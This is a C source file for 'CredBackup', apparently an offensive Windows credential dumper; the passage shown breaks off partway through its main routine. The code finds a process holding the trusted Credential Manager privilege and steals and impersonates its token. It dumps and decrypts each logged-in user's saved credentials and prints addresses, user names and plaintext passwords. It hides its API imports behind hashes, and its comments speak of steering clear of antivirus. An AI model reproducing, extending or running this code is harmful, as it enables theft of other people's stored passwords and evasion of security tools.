#include "credman.h"

extern HANDLE hHeap;
extern HANDLE StdHandle;

//ntdll.dll
extern HMODULE hNtdll;

static pNtOpenFile NtOpenFile;
static pNtClose NtClose;
static pNtDeleteFile NtDeleteFile;
static pNtSetInformationThread NtSetInformationThread;
static pNtReadFile NtReadFile;
static pNtQueryInformationFile NtQueryInformationFile;
static pNtQueryInformationToken NtQueryInformationToken;
static pNtAdjustPrivilegesToken NtAdjustPrivilegesToken;
static pNtDuplicateToken NtDuplicateToken;
static pRtlAllocateAndInitializeSid RtlAllocateAndInitializeSid;
static pNtOpenProcess NtOpenProcess;
static pNtQuerySystemInformation NtQuerySystemInformation;
static pRtlFreeSid RtlFreeSid;
static pNtOpenProcessToken NtOpenProcessToken;
static pRtlQueryEnvironmentVariable_U RtlQueryEnvironmentVariable_U;
static pNtCreateFile NtCreateFile;
static pRtlGetCurrentDirectory_U RtlGetCurrentDirectory_U;
//ntdll.dll

//kernel32.dll
HeapAlloc_ pHeapAlloc;
HeapReAlloc_ pHeapReAlloc;
HeapFree_ pHeapFree;
HeapCreate_ pHeapCreate;
HeapDestroy_ pHeapDestroy;
ExitProcess_ pExitProcess;
static WriteFile_ pWriteFile;
//kernel32.dll

//advapi32.dll
static pCredBackupCredentials CredBackupCredentials;
static CheckTokenMembership_ pCheckTokenMembership;
static LookupPrivilegeValueW_ pLookupPrivilegeValueW;
static ConvertSidToStringSidA_ pConvertSidToStringSidA;
static LookupAccountSidA_ pLookupAccountSidA;
//advapi32.dll

//crypt32.dll
static CryptUnprotectData_ pCryptUnprotectData;
//crypt32.dll

static BOOL isAdmin(void)
{
	BOOL bSuccess = FALSE;
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	PSID AdministratorsGroup;
	NTSTATUS hStatus;

	hStatus = RtlAllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup);
	if (hStatus != ERROR_SUCCESS)
		return bSuccess;

    pCheckTokenMembership(NULL, AdministratorsGroup, &bSuccess);

	RtlFreeSid(AdministratorsGroup);

	return bSuccess;
}

static void print_(LPCSTR lpString, DWORD dwSize)
{
	DWORD dwMemSize, bytesWritten = 0;
	LPVOID lpBuffer = NULL;

	do {

		if (!dwSize)
			dwSize = strlen(lpString);

		if (!dwSize)
			break;

		dwMemSize = dwSize * sizeof(CHAR);

		lpBuffer = MemAlloc(dwMemSize);
		if (!lpBuffer)
			break;

		memcpy(lpBuffer, lpString, dwMemSize);

		pWriteFile(StdHandle, lpBuffer, dwSize, &bytesWritten, NULL);

	} while (FALSE);

	if (lpBuffer)
		MemFree(lpBuffer);
}

static void PrintError(LPCSTR wsMsg, const NTSTATUS Status)
{
	DWORD dwChars;
	CHAR szError[MAX_PATH];

	dwChars = wsprintfA(szError, "%s0x%X\n", wsMsg, Status);

	if (dwChars)
		print_(szError, dwChars);
}

static void wprint(LPCWSTR lpStr, DWORD dwSize) 
{
	DWORD cbString, bytesWritten;
	LPSTR lpString = NULL;

	do {

		if (!dwSize)
			dwSize = wcslen(lpStr);

		if (!dwSize)
			break;

		cbString = WideCharToMultiByte(CP_UTF8, 0, lpStr, dwSize, NULL, 0, NULL, NULL);
		if (!cbString)
			break;

		lpString = MemAlloc(cbString);
		if (!cbString)
			break;

		if (!WideCharToMultiByte(CP_UTF8, 0, lpStr, dwSize, lpString, cbString, NULL, NULL))
			break;

		pWriteFile(StdHandle, lpString, cbString, &bytesWritten, NULL);

	} while (FALSE);

	if (lpString)
		MemFree(lpString);
}

static NTSTATUS get_process_with_priviledge(const HANDLE PID, LPCWSTR lpPriviledgeName, const BOOL bDuplicate, HANDLE* TokenOut)
{
	DWORD Status = NO_ERROR, i = 0, dwRet = 0;
	HANDLE hProc = NULL, hToken = NULL, hDupToken = NULL;
	OBJECT_ATTRIBUTES ObjectAttr, ObjectDuplicate;
	ULONG uReturnLen = 0;
	PTOKEN_PRIVILEGES pTokenPrivileges = NULL;
	BOOL bFound = FALSE;
	SECURITY_QUALITY_OF_SERVICE Qos;
	ACCESS_MASK ProcDesiredAccess = TOKEN_QUERY;
	LUID RequiredLUID;
	TOKEN_PRIVILEGES tp;
	CLIENT_ID cID;

	do {
		if (!PID || !lpPriviledgeName)
			break;

		cID.UniqueProcess = PID;
		cID.UniqueThread = NULL;

		ObjectAttr.Length = sizeof(OBJECT_ATTRIBUTES);
		ObjectAttr.Attributes = 0;
		ObjectAttr.ObjectName = ObjectAttr.RootDirectory = ObjectAttr.SecurityDescriptor = ObjectAttr.SecurityQualityOfService = NULL;

		Status = NtOpenProcess(&hProc, PROCESS_QUERY_LIMITED_INFORMATION, &ObjectAttr, &cID);
		if (Status != ERROR_SUCCESS)
			break;

		if (bDuplicate)
			ProcDesiredAccess |= TOKEN_DUPLICATE;

		Status = NtOpenProcessToken(hProc, ProcDesiredAccess, &hToken);
		if (Status != NO_ERROR)
			break;

		Status = NtQueryInformationToken(hToken, TokenPrivileges, NULL, 0, &uReturnLen);
		if (Status != STATUS_BUFFER_TOO_SMALL)
			break;

		pTokenPrivileges = MemAlloc(uReturnLen);
		if (!pTokenPrivileges) {
			Status = GetLastError();
			break;
		}

		Status = NtQueryInformationToken(hToken, TokenPrivileges, pTokenPrivileges, uReturnLen, &uReturnLen);
		if (Status != ERROR_SUCCESS)
			break;
		
		if (!pLookupPrivilegeValueW(NULL, lpPriviledgeName, &RequiredLUID)) {
			Status = GetLastError();
			break;
		}
		
		for (i = 0; i < pTokenPrivileges->PrivilegeCount; i++)
		{
			if ((pTokenPrivileges->Privileges[i].Luid.HighPart != RequiredLUID.HighPart) || (pTokenPrivileges->Privileges[i].Luid.LowPart != RequiredLUID.LowPart))
				continue;

			if (bDuplicate) {
				Qos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
				Qos.ImpersonationLevel = SecurityImpersonation;
				Qos.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;
				Qos.EffectiveOnly = FALSE;

				ObjectDuplicate.Length = sizeof(OBJECT_ATTRIBUTES);
				ObjectDuplicate.RootDirectory = ObjectDuplicate.ObjectName = ObjectDuplicate.SecurityDescriptor = NULL;
				ObjectDuplicate.Attributes = 0;
				ObjectDuplicate.SecurityQualityOfService = &Qos;

				Status = NtDuplicateToken(hToken, TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &ObjectDuplicate, FALSE, TokenImpersonation, &hDupToken);
				if (Status != ERROR_SUCCESS)
					break;

				tp.PrivilegeCount = 1;
				tp.Privileges[0].Luid = pTokenPrivileges->Privileges[i].Luid;
				tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

				Status = NtAdjustPrivilegesToken(hDupToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
			}

			bFound = TRUE;
			break;
		}

	} while (FALSE);

	if (pTokenPrivileges)
		MemFree(pTokenPrivileges);

	if (hToken)
		NtClose(hToken);

	if (hProc)
		NtClose(hProc);

	if (bFound && bDuplicate) {

		if (Status == ERROR_SUCCESS && hDupToken)
			*TokenOut = hDupToken;
		else
			NtClose(hDupToken);
	}

	if (!bFound)
		Status = ERROR_NOT_FOUND;

	return Status;
}

static NTSTATUS FindCredmanToken(HANDLE* TokenOut)
{
	PSYSTEM_PROCESS_INFORMATION pProcesses = NULL, ProcBackup = NULL;
	HANDLE hToken;
	ULONG uLen = 0, uRetlen = 0;
	PTPROCESS tList = NULL;
	DWORD dwEntries = 0, i;
	NTSTATUS Status;

	do {

		tList = MemAlloc(sizeof(PTPROCESS) * MAX_PATH);
		if (!tList) {
			Status = GetLastError();
			break;
		}

		Status = NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &uLen);
		if (Status != STATUS_INFO_LENGTH_MISMATCH)
			break;

		pProcesses = MemAlloc(uLen);
		if (!pProcesses) {
			Status = GetLastError();
			break;
		}

		ProcBackup = pProcesses;

		Status = NtQuerySystemInformation(SystemProcessInformation, pProcesses, uLen, &uRetlen);
		if (Status != ERROR_SUCCESS)
			break;

		while (pProcesses->NextEntryOffset != 0)
		{
			do {

				if (pProcesses->ImageName.Buffer == NULL || pProcesses->ImageName.Length == 0 || pProcesses->ProcessId == NULL)
					break;

				if (wcsstr(pProcesses->ImageName.Buffer, L".exe") == NULL) // Ignore Memory Compression or similar
					break;

				if (wcsncmp(pProcesses->ImageName.Buffer, ws_lsass, pProcesses->ImageName.Length / sizeof(WCHAR)) == 0) // Ignore lsass.exe. Due to AVs
					break;

				if (wcsncmp(pProcesses->ImageName.Buffer, ws_smss, pProcesses->ImageName.Length / sizeof(WCHAR)) == 0) // Ignore smss.exe. Due to AVs
					break;

				Status = get_process_with_priviledge(pProcesses->ProcessId, szSeTrustedCredmanAccessPrivilege, FALSE, NULL);
				if (Status != ERROR_SUCCESS)
					break;

				tList[dwEntries].Pid = pProcesses->ProcessId;
				tList[dwEntries].ProcessName = pProcesses->ImageName.Buffer;
				tList[dwEntries].ProcessLength = pProcesses->ImageName.Length;

				dwEntries += 1;
			} while (FALSE);

			pProcesses = (PSYSTEM_PROCESS_INFORMATION)((DWORD_PTR)pProcesses + (DWORD_PTR)pProcesses->NextEntryOffset);
		}

	} while (FALSE);

	if (tList && dwEntries)
	{
		
		for (i = 0; i < dwEntries; i++)
		{
			if (wcsncmp(tList[i].ProcessName, ws_winlogon, tList[i].ProcessLength / sizeof(WCHAR)) == 0) //Try to avoid using winlogon
				continue;

			Status = get_process_with_priviledge(tList[i].Pid, szSeTrustedCredmanAccessPrivilege, TRUE, &hToken);
			if (Status == ERROR_SUCCESS)
				break;
		}

		if (!hToken) {
			for (i = 0; i < dwEntries; i++)
			{
				Status = get_process_with_priviledge(tList[i].Pid, szSeTrustedCredmanAccessPrivilege, TRUE, &hToken);
				if (Status == ERROR_SUCCESS)
					break;

			}
		}
			
	}

	if (tList)
		MemFree(tList);

	if (ProcBackup)
		MemFree(ProcBackup);

	if (hToken)
		*TokenOut = hToken;

	return Status;
}

static NTSTATUS DeleteFileFromDisk(LPCWSTR lpFile)
{
	WCHAR wsFilePath[MAX_PATH + 1];
	OBJECT_ATTRIBUTES ObjectAttr;
	UNICODE_STRING uPath;
	NTSTATUS Status;

	do {

		wcscpy(wsFilePath, ws_NtPathStart);
		wcscat(wsFilePath, lpFile);

		uPath.Buffer = wsFilePath;
		uPath.Length = (USHORT)(wcslen(wsFilePath) * sizeof(WCHAR));
		uPath.MaximumLength = uPath.Length + sizeof(WCHAR);

		InitializeObjectAttributes(&ObjectAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

		Status = NtDeleteFile(&ObjectAttr);

	} while (FALSE);

	return Status;
}

static NTSTATUS ReadFileFromDisk(LPCWSTR lpFilePath, LPVOID* lpData, DWORD* dwDataLen)
{
	IO_STATUS_BLOCK IoStatusBlock, IoStatusBlockQuery, IoStatusBlockRead;
	OBJECT_ATTRIBUTES ObjectAttributes;
	FILE_STANDARD_INFORMATION fileInfo;
	LPVOID lpFileData = NULL;
	NTSTATUS Status;
	DWORD dwReaden = 0, dwFileLen;
	HANDLE hFile = NULL;
	UNICODE_STRING uPath;

	WCHAR wsFilePath[MAX_PATH + 1];

	do {

		wcscpy(wsFilePath, ws_NtPathStart);
		wcscat(wsFilePath, lpFilePath);

		uPath.Buffer = wsFilePath;
		uPath.Length = (USHORT)(wcslen(wsFilePath) * sizeof(WCHAR));
		uPath.MaximumLength = uPath.Length + sizeof(WCHAR);
		
		InitializeObjectAttributes(&ObjectAttributes, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

		Status = NtOpenFile(&hFile, SYNCHRONIZE | FILE_READ_DATA, &ObjectAttributes, &IoStatusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);
		if (Status != ERROR_SUCCESS)
			break;

		Status = NtQueryInformationFile(hFile, &IoStatusBlockQuery, &fileInfo, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
		if (Status != ERROR_SUCCESS || fileInfo.EndOfFile.QuadPart == 0)
			break;

		dwFileLen = (DWORD)fileInfo.EndOfFile.QuadPart;
		if (!dwFileLen) {
			Status = ERROR_EMPTY;
			break;
		}

		lpFileData = MemAlloc(dwFileLen);
		if (!lpFileData) {
			Status = GetLastError();
			break;
		}

		Status = NtReadFile(hFile, NULL, NULL, NULL, &IoStatusBlockRead, lpFileData, dwFileLen, NULL, NULL);
		if (Status != ERROR_SUCCESS) {
			Status = GetLastError();
			break;
		}

	} while (FALSE);

	if (hFile)
		NtClose(hFile);

	if (Status == ERROR_SUCCESS) {
		*lpData = lpFileData;
		*dwDataLen = dwFileLen;
	}
	else {
		if (lpFileData)
			MemFree(lpFileData);
	}

	return Status;
}

static NTSTATUS QueryEnvironVariable(LPWSTR lpName, LPWSTR* lpValue, DWORD* cbValue) 
{
	UNICODE_STRING VariableName, VariableValue;
	LPWSTR lpVariableValue = NULL;
	unsigned int cbName, cbVariableValue;
	NTSTATUS Status = ERROR_NOT_FOUND;

	do {

		cbName = wcslen(lpName);
		if (!cbName)
			break;

		VariableName.Buffer = lpName;
		VariableName.Length = (USHORT)(cbName * sizeof(WCHAR));
		VariableName.MaximumLength = VariableName.Length + sizeof(WCHAR);

		cbVariableValue = MAX_PATH * sizeof(WCHAR);

		lpVariableValue = MemAlloc(cbVariableValue + sizeof(WCHAR));
		if (!lpVariableValue) {
			Status = GetLastError();
			break;
		}

		VariableValue.Buffer = lpVariableValue;
		VariableValue.Length = cbVariableValue;
		VariableValue.MaximumLength = VariableValue.Length + sizeof(WCHAR);

		Status = RtlQueryEnvironmentVariable_U(NULL, &VariableName, &VariableValue);
		if (Status != ERROR_SUCCESS)
			break;

		*lpValue = lpVariableValue;
		*cbValue = VariableValue.Length;

	} while (FALSE);

	if (Status != ERROR_SUCCESS && lpVariableValue)
		MemFree(lpVariableValue);

	return Status;
}

/*
	DWORD Status = NO_ERROR, cbCryptedCreds = 0, cbSys = 0, cbRandomFile = 0, dwHashNow = 0, cbTargetAlias = 0, cbUnkData = 0,
		cbComment = 0, cbCredentialBlob = 0, cbUserName = 0, cbName = 0, cbcUserName = 0, cbcPasw = 0;
	PCRED_BACKUP_FILE_HEADER pCred = NULL;
	PKULL_M_CRED_BLOB pCredBlob = NULL;
	LPWSTR lpSys = NULL, wsRandomFile = NULL, uBuffer = NULL, lpTargetName = NULL, lpTargetAlias = NULL, lpUserName = NULL,
		lpUnkData = NULL, lpComment = NULL;
	LPSTR szRandomFile = NULL, szFullRandomFile = NULL, lpName = NULL, lpNameBk = NULL, lpcUserName = NULL, lpcPasw = NULL;
	TOKEN_USER* pToken = NULL;
	ULONG uRequiredSize = 0, uReturnLen = 0;
	HANDLE hProc = NULL, hUserToken = NULL;
	OBJECT_ATTRIBUTES ObjectAttr;
	LPVOID lpCryptedCreds = NULL, lpCredentialBlob = NULL;
*/

static NTSTATUS DecryptCredManager(const HANDLE hUserToken, LPCWSTR lpCredsPath)
{
	LPWSTR lpTargetName = NULL, lpUnkData = NULL, lpComment = NULL, lpTargetAlias = NULL, lpUserName = NULL;
	DWORD cbCredData, cbUnkData = 0, cbComment = 0, cbTargetAlias = 0, cbUserName = 0, cbCredentialBlob = 0;
	SID_NAME_USE snu = SidTypeUser;
	PKULL_M_CRED_BLOB CredentialBlob = NULL;
	DATA_BLOB DataOut, DataIn;
	LPVOID lpCredData = NULL, lpCredentialBlob = NULL;
	BOOL bDeleteFile = FALSE;
	unsigned int sSize;
	NTSTATUS Status;

	DataOut.pbData = NULL;

	do {
		if (!CredBackupCredentials(hUserToken, lpCredsPath, NULL, 0, 0)) {
			Status = GetLastError();
			break;
		}

		bDeleteFile = TRUE;

		Status = ReadFileFromDisk(lpCredsPath, &lpCredData, &cbCredData);
		if (Status != ERROR_SUCCESS)
			break;

		Status = DeleteFileFromDisk(lpCredsPath);
		if (Status != ERROR_SUCCESS)
			break;

		bDeleteFile = FALSE;

		DataIn.pbData = lpCredData;
		DataIn.cbData = cbCredData;

		if (!pCryptUnprotectData(&DataIn, NULL, NULL, NULL, NULL, CRYPTPROTECT_UI_FORBIDDEN, &DataOut)) {
			Status = GetLastError();
			break;
		}

		//Free unnecessary data
		MemFree(lpCredData); lpCredData = NULL;

		CredentialBlob = (LPVOID)((ULONG_PTR)DataOut.pbData + sizeof(CRED_BACKUP_FILE_HEADER));

		if (!CredentialBlob->credSize) {
			Status = ERROR_NOT_FOUND;
			break;
		}

		do {
			/* github.com/gentilkiwi/mimikatz/blob/e10bde5b16b747dc09ca5146f93f2beaf74dd17a/modules/kull_m_cred.c */

			sSize = 0;
			lpTargetName = (LPVOID)((ULONG_PTR)CredentialBlob + FIELD_OFFSET(KULL_M_CRED_BLOB, TargetName));
			cbUnkData = *(PDWORD)((ULONG_PTR)lpTargetName + CredentialBlob->dwTargetName);
			lpUnkData = (LPVOID)((ULONG_PTR)lpTargetName + CredentialBlob->dwTargetName + sizeof(DWORD));
			cbComment = *(PDWORD)((ULONG_PTR)lpUnkData + cbUnkData);
			lpComment = (LPVOID)((ULONG_PTR)lpUnkData + cbUnkData + sizeof(DWORD));
			cbTargetAlias = *(PDWORD)((ULONG_PTR)lpComment + cbComment);
			lpTargetAlias = (LPWSTR)((ULONG_PTR)lpComment + cbComment + sizeof(DWORD));
			cbUserName = *(PDWORD)((ULONG_PTR)lpTargetAlias + cbTargetAlias);
			lpUserName = (LPWSTR)((ULONG_PTR)lpTargetAlias + cbTargetAlias + sizeof(DWORD));
			cbCredentialBlob = *(PDWORD)((ULONG_PTR)lpUserName + cbUserName);
			lpCredentialBlob = (PBYTE)lpUserName + cbUserName + sizeof(DWORD);

			if (wcsstr(lpTargetName, ws_DomainTarget) != NULL) //Skip Domain:target=
				sSize = wcslen(ws_DomainTarget);
			else
				if (wcsstr(lpTargetName, ws_DomainName) != NULL) //Skip Domain:name=
					sSize = wcslen(ws_DomainTarget);

			if (sSize) {
				lpTargetName += sSize;
				CredentialBlob->dwTargetName -= (sSize * sizeof(WCHAR));
			}

			print_("Address: ", 0);
			wprint(lpTargetName, CredentialBlob->dwTargetName / sizeof(WCHAR) - sizeof(CHAR));
			print_("\n", 0);

			print_("User: ", 0);
			wprint(lpUserName, cbUserName / sizeof(WCHAR) - sizeof(CHAR));
			print_("\n", 0);

			print_("Password: ", 0);
			wprint(lpCredentialBlob, cbCredentialBlob / sizeof(WCHAR));
			print_("\n\n", 0);

			CredentialBlob = (LPVOID)((ULONG_PTR)CredentialBlob + CredentialBlob->credSize);

		} while ((DWORD)(CredentialBlob + sizeof(CHAR)) <= (DWORD)(LPVOID)(DataOut.pbData + DataOut.cbData));

	} while (FALSE);

	if (DataOut.pbData)
		LocalFree(DataOut.pbData);

	if (lpCredData)
		MemFree(lpCredData);

	if (bDeleteFile)
		DeleteFileFromDisk(lpCredsPath);

	return Status;
}

BOOL bResolveFunctions(void)
{
	BOOL bRet = FALSE;
	HANDLE hAdvapi32, hCrypt32, hKernel32;

	do {

		if (!bInitResolve())
			break;
		
		NtOpenFile = (pNtOpenFile)resolve_function(hNtdll, 0x726CE1C9C29C5019); //NtOpenFile
		NtClose = (pNtClose)resolve_function(hNtdll, 0xD0AB8B8E133D); //NtClose
		NtDeleteFile = (pNtDeleteFile)resolve_function(hNtdll, 0xC12A9D23D914861A); //NtDeleteFile
		NtSetInformationThread = (pNtSetInformationThread)resolve_function(hNtdll, 0xB788744854212E31); //NtSetInformationThread
		NtReadFile = (pNtReadFile)resolve_function(hNtdll, 0x726CE1E42E979AE3); //NtReadFile
		NtQueryInformationFile = (pNtQueryInformationFile)resolve_function(hNtdll, 0x779A8B4725F863); //NtQueryInformationFile
		NtQueryInformationToken = (pNtQueryInformationToken)resolve_function(hNtdll, 0xF6AEBF42CE5A244); //NtQueryInformationToken
		NtAdjustPrivilegesToken = (pNtAdjustPrivilegesToken)resolve_function(hNtdll, 0x9B44E0896921F9CD); //NtAdjustPrivilegesToken
		NtDuplicateToken = (pNtDuplicateToken)resolve_function(hNtdll, 0xD704DDB93000ECC3); //NtDuplicateToken
		RtlAllocateAndInitializeSid = (pRtlAllocateAndInitializeSid)resolve_function(hNtdll, 0x986BB2B735F62CE1); //RtlAllocateAndInitializeSid
		NtOpenProcess = (pNtOpenProcess)resolve_function(hNtdll, 0xE6BBE3E35003C058); //NtOpenProcess
		NtQuerySystemInformation = (pNtQuerySystemInformation)resolve_function(hNtdll, 0xF1F98FB8EE4F73A8); //NtQuerySystemInformation
		RtlFreeSid = (pRtlFreeSid)resolve_function(hNtdll, 0x726D8BB512EE8FD9); //RtlFreeSid
		NtOpenProcessToken = (pNtOpenProcessToken)resolve_function(hNtdll, 0xE8DF6F357BD07459); //NtOpenProcessToken
		RtlQueryEnvironmentVariable_U = (pRtlQueryEnvironmentVariable_U)resolve_function(hNtdll, 0xC6229914E517CD5C); //RtlQueryEnvironmentVariable_U
		NtCreateFile = (pNtCreateFile)resolve_function(hNtdll, 0xC12A834815A5ECDB); //NtCreateFile
		RtlGetCurrentDirectory_U = (pRtlGetCurrentDirectory_U)resolve_function(hNtdll, 0xBAA3972B262B7D23); //RtlGetCurrentDirectory_U

		if (!NtOpenFile || !NtClose || !NtDeleteFile || !NtSetInformationThread || !NtReadFile || !NtQueryInformationFile || !RtlGetCurrentDirectory_U ||
			!NtQueryInformationToken || !NtAdjustPrivilegesToken || !NtDuplicateToken || !RtlAllocateAndInitializeSid || !NtCreateFile ||
			!NtOpenProcess || !NtQuerySystemInformation || !RtlFreeSid || !NtOpenProcessToken || !RtlQueryEnvironmentVariable_U)
			break;

		hKernel32 = ModuleBaseAddress(0xD537E9367040EE75); //kernel32.dll
		if (!hKernel32)
			break;

		pHeapAlloc = (HeapAlloc_)resolve_function(hKernel32, 0x377A1841FFD670E); //HeapAlloc
		pHeapReAlloc = (HeapReAlloc_)resolve_function(hKernel32, 0xBFE613111E31C125); //HeapReAlloc
		pHeapFree = (HeapFree_)resolve_function(hKernel32, 0x1AE5DD374893C5); //HeapFree
		pHeapCreate = (HeapCreate_)resolve_function(hKernel32, 0x726BD20824BD1D77); //HeapCreate
		pHeapDestroy = (HeapDestroy_)resolve_function(hKernel32, 0xBFE6130CEC0FB46D); //HeapDestroy
		pExitProcess = (ExitProcess_)resolve_function(hKernel32, 0xBFD8EC92B769339E); //ExitProcess
		pWriteFile = (WriteFile_)resolve_function(hKernel32, 0x377B537663CECB0); //WriteFile

		if (!pHeapAlloc || !pHeapReAlloc || !pHeapFree || !pHeapCreate || !pHeapDestroy || !pExitProcess ||
			!pWriteFile)
			break;

		hAdvapi32 = LdrLoadDll(ws_advapi32, FALSE);
		if (!hAdvapi32)
			break;

		CredBackupCredentials = (pCredBackupCredentials)resolve_function(hAdvapi32, 0x50A02181B65B7B07); //CredBackupCredentials
		pCheckTokenMembership = (CheckTokenMembership_)resolve_function(hAdvapi32, 0xAAB960B9FEDA76F0); //CheckTokenMembership
		pLookupPrivilegeValueW = (LookupPrivilegeValueW_)resolve_function(hAdvapi32, 0xF17256B7BBAE6E9A); //LookupPrivilegeValueW
		pConvertSidToStringSidA = (ConvertSidToStringSidA_)resolve_function(hAdvapi32, 0x6A77CD0099A22DC1); //ConvertSidToStringSidA
		pLookupAccountSidA = (LookupAccountSidA_)resolve_function(hAdvapi32, 0x33E51D10BC518D2D); //LookupAccountSidA

		if (!CredBackupCredentials || !pCheckTokenMembership || !pLookupPrivilegeValueW ||
			!pConvertSidToStringSidA || !pLookupAccountSidA)
			break;

		hCrypt32 = LdrLoadDll(ws_crypt32, FALSE);
		if (!hCrypt32)
			break;

		pCryptUnprotectData = (CryptUnprotectData_)resolve_function(hCrypt32, 0xA431D346872258B5); //CryptUnprotectData
		if (!pCryptUnprotectData)
			break;

		bRet = TRUE;

	} while (FALSE);

	return bRet;
}

void doBackup(LPCWSTR lpFile) 
{
	PSYSTEM_PROCESS_INFORMATION pProcesses = NULL, ProcBackup = NULL;
	HANDLE hProc = NULL, hUserToken = NULL, hFile = NULL;
	BOOL bRevert = FALSE, bAllreadyImpersonated;
	DWORD cbUserName, cbDomainName, dwLastSid = 0, cbSystemRoot, dwChars, cbCurrentDirectory;
	IO_STATUS_BLOCK IoStatusBlock;
	PIMPERSONATED Impersonated = NULL;
	SID_NAME_USE snu = SidTypeUser;
	LPWSTR lpSystemRoot = NULL;
	OBJECT_ATTRIBUTES ObjectAttr;
	ULONG uLen = 0, uRetlen = 0;
	HANDLE hToken = NULL, hSetToken;
	UNICODE_STRING uPath;
	PTOKEN_USER pToken = NULL;
	ULONG uReturnLen;
	CLIENT_ID clientID;
	NTSTATUS Status;
	LPSTR CurrentSID;
	unsigned int i;

	CHAR lpErrorMessage[MAX_PATH];
	CHAR lpUser[UNLEN + 1];
	CHAR lpDomainName[DNLEN + 1];
	WCHAR lpCredsPath[MAX_PATH + 1];
	WCHAR szFilePath[MAX_PATH + 1];
	WCHAR lpCurrentDirectory[MAX_PATH + 1];

	//check MAX_PATH

	do {

		if (lpFile) {
			
			cbCurrentDirectory = RtlGetCurrentDirectory_U(MAX_PATH * sizeof(WCHAR), lpCurrentDirectory);
			if (!cbCurrentDirectory) {
				Status = ERROR_NOT_FOUND;
				break;
			}

			wcscpy(szFilePath, ws_NtPathStart);
			wcscat(szFilePath, lpCurrentDirectory);
			wcscat(szFilePath, FolderSeparator);
			wcscat(szFilePath, lpFile);

			uPath.Buffer = szFilePath;
			uPath.Length = (USHORT)(wcslen(szFilePath) * sizeof(WCHAR));
			uPath.MaximumLength = uPath.Length + sizeof(WCHAR);

			InitializeObjectAttributes(&ObjectAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

			//check
			Status = NtCreateFile(&hFile, SYNCHRONIZE | FILE_WRITE_DATA | DELETE, &ObjectAttr, &IoStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_SUPERSEDE, FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, 0, 0);
			if (Status != NO_ERROR)
				break;

			StdHandle = hFile;
		}

		print_("[+] CredBackup v0.1\n", 0);

		if (!isAdmin()) {
			print_("[-] Please run as admin!", 0);
			break;
		}

		Status = FindCredmanToken(&hToken);
		if (Status != ERROR_SUCCESS) {
			break;
		}

		hSetToken = hToken;
		Status = NtSetInformationThread(NtCurrentThread(), ThreadImpersonationToken, &hSetToken, sizeof(HANDLE));
		if (Status != ERROR_SUCCESS)
			break;

		bRevert = TRUE;

		// Find explorer.exe of all logged in users

		Status = NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &uLen);
		if (Status != STATUS_INFO_LENGTH_MISMATCH)
			break;

		pProcesses = MemAlloc(uLen);
		if (!pProcesses) {
			Status = GetLastError();
			break;
		}

		ProcBackup = pProcesses;

		Status = NtQuerySystemInformation(SystemProcessInformation, pProcesses, uLen, &uRetlen);
		if (Status != ERROR_SUCCESS)
			break;

		Status = QueryEnvironVariable(ws_SystemRoot, &lpSystemRoot, &cbSystemRoot);
		if (Status != ERROR_SUCCESS)
			break;

		print_("\n", 1);

		//lpImageBaseAddress is unique enought for this purpose

		wsprintfW(lpCredsPath, L"%s%s%s%s%d%s", lpSystemRoot, FolderSeparator, ws_Temp, FolderSeparator, ImageBaseAddress(), ws_TempFileExtension);

		Impersonated = MemAlloc(sizeof(IMPERSONATED) * MAX_PATH);
		if (!Impersonated) {
			Status = GetLastError();
			break;
		}

		while (pProcesses->NextEntryOffset != 0)
		{
			hProc = hUserToken = pToken = NULL;

			do {

				if ((pProcesses->ImageName.Buffer) && 
					(wcsncmp(pProcesses->ImageName.Buffer, ws_explorer, pProcesses->ImageName.Length / sizeof(WCHAR)) != 0) &&
					(wcsncmp(pProcesses->ImageName.Buffer, ws_TaskHost, pProcesses->ImageName.Length / sizeof(WCHAR)) != 0) &&
					(wcsncmp(pProcesses->ImageName.Buffer, ws_TaskHostEx, pProcesses->ImageName.Length / sizeof(WCHAR)) != 0) &&
					(wcsncmp(pProcesses->ImageName.Buffer, ws_TaskHostW, pProcesses->ImageName.Length / sizeof(WCHAR)) != 0)
					)
					break;

				clientID.UniqueProcess = pProcesses->ProcessId;
				clientID.UniqueThread = NULL;

				ObjectAttr.Length = sizeof(OBJECT_ATTRIBUTES);
				ObjectAttr.Attributes = 0;
				ObjectAttr.ObjectName = ObjectAttr.RootDirectory = ObjectAttr.SecurityDescriptor = ObjectAttr.SecurityQualityOfService = NULL;

				Status = NtOpenProcess(&hProc, PROCESS_QUERY_LIMITED_INFORMATION, &ObjectAttr, &clientID);
				if (Status != ERROR_SUCCESS)
					break;

				Status = NtOpenProcessToken(hProc, TOKEN_QUERY | TOKEN_DUPLICATE, &hUserToken);
				if (Status != NO_ERROR)
					break;

				//Get Impersonated User Info
				Status = NtQueryInformationToken(hUserToken, TokenUser, NULL, 0, &uReturnLen);
				if (Status != STATUS_BUFFER_TOO_SMALL)
					break;

				pToken = MemAlloc(uReturnLen);
				if (!pToken) {
					Status = GetLastError();
					break;
				}

				Status = NtQueryInformationToken(hUserToken, TokenUser, pToken, uReturnLen, &uReturnLen);
				if (Status != NO_ERROR)
					break;

				//Check if allready Impersonated

				CurrentSID = NULL;

				if (!pConvertSidToStringSidA(pToken->User.Sid, &CurrentSID)) {
					Status = GetLastError();
					break;
				}

				bAllreadyImpersonated = FALSE;

				for (i = 0; i < dwLastSid; i++) {

					if (strncmp(Impersonated[i].SID, CurrentSID, Impersonated[i].SidSize) == 0) {
						bAllreadyImpersonated = TRUE;
						break;
					}
				}

				if (bAllreadyImpersonated) {
					break;
				}

